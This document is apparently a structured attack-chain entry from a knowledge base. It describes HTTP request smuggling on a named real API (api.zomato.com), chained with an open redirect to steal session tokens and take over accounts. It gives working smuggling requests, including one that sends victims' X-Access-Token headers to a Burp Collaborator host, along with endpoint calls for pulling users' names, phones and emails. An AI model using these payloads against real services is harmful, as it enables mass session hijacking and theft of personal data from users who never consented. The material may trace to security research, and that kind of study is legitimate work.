---
tags:
  - http-smuggling
  - session-hijacking
  - open-redirect
  - account-takeover
  - pii-leakage
type: attack_chain
tools:
  - '[[tools/Custom-HTTP-Smuggling-Tools]]'
  - '[[tools/Burp-Suite]]'
  - '[[tools/Burp-Collaborator]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
commands:
  - '[[commands/http-smuggling-discovery-payload]]'
  - '[[commands/http-smuggling-payload-to-hijack]]'
  - '[[commands/http-smuggling-with-redirect]]'
  - '[[commands/get-tabbed-home]]'
  - '[[commands/get-userdetails]]'
  - '[[commands/post-auth]]'
platforms:
  - Web
complexity: medium
procedures:
  - '[[procedures/Discover-HTTP-Request-Smuggling-Vulnerability]]'
  - '[[procedures/Craft-HTTP-Smuggling-Payload-to-Poison-Socket]]'
  - '[[procedures/Chain-Smuggling-with-Open-Redirect-to-Steal-Tokens]]'
  - '[[procedures/Perform-Account-Takeover-with-Stolen-Tokens]]'
step_count: 4
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Use Alternate Authentication Material]]'
  - '[[Valid Accounts]]'
description: >-
  Multi-stage attack exploiting HTTP Request Smuggling and open redirect on
  api.zomato.com to steal session tokens and perform mass account takeovers
skill_level: intermediate
impact_level: high
id: 61dbea54-2c07-49a1-a13e-312c80b9bd98
created_at: '2025-12-13T09:01:26.175Z'
updated_at: '2025-12-13T09:01:26.175Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Use Alternate Authentication Material]]'
  - '[[Valid Accounts]]'
---
# HTTP Request Smuggling for Mass Session Takeover on Zomato API

Multi-stage attack chain demonstrating HTTP Request Smuggling (CL.TE desync) on api.zomato.com, caused by mismatched header parsing between frontend (Akamai) and backend servers. This allows socket poisoning, chaining with an open redirect to steal X-Access-Token headers, enabling mass session takeovers and PII leakage.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~15 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Discovery] --> B[Payload Crafting]
    B --> C[Chained Exploitation]
    C --> D[Account Takeover]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Custom-HTTP-Smuggling-Tools]]
- [[tools/Burp-Suite]]
- [[tools/Burp-Collaborator]]

### Target Environment

- Target OS/Platform: Web
- Required services/ports: api.zomato.com on port 443
- Network access requirements: Direct internet access to api.zomato.com

### Initial Access Requirements

- Credential requirements: None initially
- Network position: External attacker
- Prior access needed: None

## Detailed Attack Procedures

### Step 1: Discover Vulnerability
procedure: [[procedures/Discover-HTTP-Request-Smuggling-Vulnerability]]

**Objective**: Identify HTTP Request Smuggling vulnerability using automated testing.

**Instructions**: Use [[tools/Custom-HTTP-Smuggling-Tools]] to test over 150 smuggling payloads, focusing on the 'tabprefix1' variant with a tab after the Transfer-Encoding colon. Send requests to api.zomato.com to detect desync between frontend and backend.

**Expected Output**: Confirmation of CL.TE desync where frontend falls back to Content-Length and backend uses chunked encoding.

**Success Indicators**:
- Detection of socket poisoning capability
- Identification of vulnerable header parsing

### Step 2: Craft Smuggling Payload
procedure: [[procedures/Craft-HTTP-Smuggling-Payload-to-Poison-Socket]]

**Objective**: Create a payload to poison the backend socket and hijack victim requests.

**Instructions**: Using [[tools/Burp-Suite]], craft and send the smuggling request with [[commands/http-smuggling-payload-to-hijack]]:

```http
DELETE / HTTP/1.1
Transfer-Encoding: chunked
Host: api.zomato.com
Content-Length: 51
User-Agent: Treasure/6.7
0

GET /some/other/endpoint HTTP/1.1
X-Ignore: X[STOP]
```

**Expected Output**: Backend socket poisoned, prepending attacker data to subsequent victim requests.

**Success Indicators**:
- Successful desync observed
- Victim requests altered

### Step 3: Chain with Open Redirect
procedure: [[procedures/Chain-Smuggling-with-Open-Redirect-to-Steal-Tokens]]

**Objective**: Exploit open redirect to steal victim session tokens in bulk.

**Instructions**: Using [[tools/Burp-Suite]] and [[tools/Burp-Collaborator]], send the chained request with [[commands/http-smuggling-with-redirect]]:

```http
DELETE / HTTP/1.1
Transfer-Encoding: chunked
Host: api.zomato.com
Content-Length: 91
User-Agent: Treasure/6.7
0

GET https://2psvzm9pf3hkuz2dptyimjaynptfh4.burpcollaborator.net/desync/ HTTP/1.1
X: X
```

Monitor Burp Collaborator for incoming requests containing victim's X-Access-Token.

**Expected Output**: Redirected victim requests with tokens logged in Collaborator.

**Success Indicators**:
- Tokens received via redirect
- Bulk collection of session data

### Step 4: Perform Account Takeover
procedure: [[procedures/Perform-Account-Takeover-with-Stolen-Tokens]]

**Objective**: Use stolen tokens to takeover accounts and extract PII.

**Instructions**: With stolen X-Access-Token, query endpoints using [[commands/get-tabbed-home]]:

```http
GET /v2/tabbed/home HTTP/1.1
```

Extract UserID, then use [[commands/get-userdetails]]:

```http
GET /v2/userdetails.json/<USERID> HTTP/1.1
```

For full takeover, intercept login with [[commands/post-auth]] and swap token/UserID.

**Expected Output**: Victim PII (name, phone, email) and successful impersonation.

**Success Indicators**:
- UserID and PII extracted
- Successful session impersonation

## Attack Chain Summary

### Key Achievements

1. Vulnerability discovery via automated testing
2. Socket poisoning and request hijacking
3. Token theft via chained redirect
4. Mass account takeovers and PII leakage

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Use Alternate Authentication Material]]
- [[Valid Accounts]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]
- [[Collection]]

*Last updated: 2023-10-01*
